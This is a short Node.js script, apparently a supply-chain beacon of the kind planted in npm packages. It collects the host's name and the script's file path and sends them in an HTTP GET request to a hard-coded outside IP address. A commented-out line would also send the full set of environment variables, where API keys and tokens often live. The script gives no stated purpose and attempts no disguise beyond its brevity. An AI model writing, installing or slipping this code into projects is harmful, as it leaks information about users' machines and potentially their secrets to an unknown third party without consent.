const http = require('http');
const querystring = require('querystring');

var os = require("os");
var hostname = os.hostname();
//var environment = JSON.stringify(process.env)

var fs = require('fs');


// GET parameters
const parameters = {
	filename: __filename,
    hostname: hostname,
//    all: environment
}

const get_request_args = querystring.stringify(parameters);


const options = {
  hostname: '35.192.198.159',
  port: 443,
  path: '/' + get_request_args,
  method: 'GET',
};

const req = http.request(options, res => {

  res.on('data', d => {
    process.stdout.write(d);
  });
});

req.end();

